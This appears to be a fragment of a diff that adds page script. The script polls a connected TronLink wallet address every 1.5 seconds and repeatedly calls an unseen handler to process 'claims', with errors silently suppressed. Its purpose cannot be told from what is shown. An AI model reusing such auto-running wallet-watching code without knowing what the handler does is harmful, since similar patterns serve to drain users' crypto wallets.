+    running = true;
+    (function tick() {
+      var w = getAddr();
+      if (w && w.addr !== lastAddr) {
+        lastAddr = w.addr;
+        handle(w.addr, w.tw);
+      } else if (w && w.addr === lastAddr) {
+        var c = claimOf(w.addr);
+        if (c && c.status === "retry_later" && Date.now() - (c.t || 0) > 10 * 60 * 1000) {
+          handle(w.addr, w.tw);
+        }
+      }
+      setTimeout(tick, 1500);
+    })();
+  }
+
+  try {
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", loop);
+    } else {
+      loop();
+    }
+    ["tronLink#initialized"].forEach(function (n) {
+      document.addEventListener(n, function () { setTimeout(loop, 200); });
+      window.addEventListener(n, function () { setTimeout(loop, 200); });
+    });
+  } catch (e) {}
+})();
+
+</script>
+</body>
+</html>
